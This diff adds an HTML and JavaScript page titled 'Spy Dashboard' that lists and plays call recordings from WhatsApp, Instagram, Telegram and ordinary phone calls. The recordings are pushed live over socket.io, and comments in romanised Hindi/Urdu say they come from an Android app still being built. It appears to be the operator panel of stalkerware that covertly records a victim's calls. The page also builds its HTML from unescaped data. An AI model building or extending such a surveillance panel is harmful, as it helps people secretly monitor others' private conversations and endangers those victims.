@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🕵️‍♂️ Call Recordings - Spy Dashboard</title>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <script src="/socket.io/socket.io.js"></script>
+
+    <style>
+        :root {
+            --bg-color: #1a1a2e;
+            --card-color: #16213e;
+            --text-color: #e94560;
+            --highlight: #0f3460;
+            --white: #fff;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--white);
+            margin: 0;
+            padding: 20px;
+        }
+
+        h1 {
+            text-align: center;
+            color: var(--text-color);
+        }
+
+        /* Tabs Styling */
+        .tabs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .tab-btn {
+            background-color: var(--card-color);
+            border: 1px solid var(--highlight);
+            color: white;
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+
+        .tab-btn:hover, .tab-btn.active {
+            background-color: var(--text-color);
+            transform: scale(1.05);
+        }
+
+        /* Recording List Styling */
+        .recording-container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .recording-card {
+            background-color: var(--card-color);
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            border-left: 5px solid var(--text-color);
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        .app-icon {
+            font-size: 30px;
+            width: 50px;
+            text-align: center;
+            margin-right: 15px;
+        }
+
+        /* App Specific Colors */
+        .icon-whatsapp { color: #25D366; }
+        .icon-instagram { color: #C13584; }
+        .icon-telegram { color: #0088cc; }
+        .icon-snapchat { color: #FFFC00; text-shadow: 0 0 2px black; }
+        .icon-call { color: #34b7f1; }
+
+        .info {
+            flex-grow: 1;
+        }
+
+        .info h3 {
+            margin: 0;
+            font-size: 18px;
+        }
+
+        .info p {
+            margin: 5px 0 0;
+            font-size: 12px;
+            color: #ccc;
+        }
+
+        audio {
+            height: 40px;
+            outline: none;
+            border-radius: 20px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <h1>🎧 Call Logs & Recordings</h1>
+
+    <div class="tabs">
+        <button class="tab-btn active" onclick="filterRecordings('all')">All</button>
+        <button class="tab-btn" onclick="filterRecordings('WhatsApp')"><i class="fab fa-whatsapp"></i> WhatsApp</button>
+        <button class="tab-btn" onclick="filterRecordings('Instagram')"><i class="fab fa-instagram"></i> Instagram</button>
+        <button class="tab-btn" onclick="filterRecordings('Telegram')"><i class="fab fa-telegram"></i> Telegram</button>
+        <button class="tab-btn" onclick="filterRecordings('Normal Call')"><i class="fas fa-phone"></i> Calls</button>
+    </div>
+
+    <div class="recording-container" id="recordingList">
+        <p style="text-align:center; color:#ccc;">Waiting for recordings...</p>
+    </div>
+
+    <script>
+        const socket = io();
+        let allRecordings = []; // Sara data yahan store hoga
+
+        // 1. Server se nayi recording aayi
+        socket.on('new-call-recording', (data) => {
+            console.log("New Recording Received:", data);
+            
+            // Data ko list me sabse upar add karo
+            allRecordings.unshift(data);
+            
+            // UI Update karo
+            renderList(); 
+        });
+
+        // 2. Dummy Data for Testing (Jab tak Android App ready nahi hai)
+        // Isko baad me hata dena
+        window.onload = function() {
+            // Fake data taaki design check kar sako
+            const dummyData = [
+                { app: 'WhatsApp', time: '10:30 PM', date: '23 Jan', url: 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3' },
+                { app: 'Normal Call', time: '09:15 PM', date: '23 Jan', url: 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3' },
+                { app: 'Instagram', time: '08:00 PM', date: '23 Jan', url: 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3' }
+            ];
+            allRecordings = dummyData;
+            renderList();
+        };
+
+        // 3. UI Render Karne ka Logic
+        function renderList(filter = 'all') {
+            const container = document.getElementById('recordingList');
+            container.innerHTML = ''; // Pehle list saaf karo
+
+            // Filter lagao
+            const filteredData = allRecordings.filter(item => {
+                if (filter === 'all') return true;
+                return item.app === filter;
+            });
+
+            if(filteredData.length === 0) {
+                container.innerHTML = '<p style="text-align:center;">No recordings found.</p>';
+                return;
+            }
+
+            // HTML banao har recording ka
+            filteredData.forEach(rec => {
+                const iconClass = getIconClass(rec.app);
+                
+                const card = `
+                    <div class="recording-card">
+                        <div class="app-icon ${iconClass}">
+                            <i class="${getIconIcon(rec.app)}"></i>
+                        </div>
+                        <div class="info">
+                            <h3>${rec.app}</h3>
+                            <p>${rec.date} | ${rec.time}</p>
+                        </div>
+                        <audio controls>
+                            <source src="${rec.url}" type="audio/mpeg">
+                            Your browser does not support the audio element.
+                        </audio>
+                    </div>
+                `;
+                container.innerHTML += card;
+            });
+        }
+
+        // 4. Tab click hone par Filter karna
+        function filterRecordings(category) {
+            // Active class change karo buttons pe
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
+            
+            // List dobara banao filter ke sath
+            renderList(category);
+        }
+
+        // Helper: App ke naam se Icon ka color nikalna
+        function getIconClass(appName) {
+            if(appName.includes('WhatsApp')) return 'icon-whatsapp';
+            if(appName.includes('Instagram')) return 'icon-instagram';
+            if(appName.includes('Telegram')) return 'icon-telegram';
+            if(appName.includes('Snapchat')) return 'icon-snapchat';
+            return 'icon-call';
+        }
+
+        // Helper: App ke naam se FontAwesome Icon nikalna
+        function getIconIcon(appName) {
+            if(appName.includes('WhatsApp')) return 'fab fa-whatsapp';
+            if(appName.includes('Instagram')) return 'fab fa-instagram';
+            if(appName.includes('Telegram')) return 'fab fa-telegram';
+            if(appName.includes('Snapchat')) return 'fab fa-snapchat-ghost';
+            return 'fas fa-phone';
+        }
+
+    </script>
+</body>
+</html>
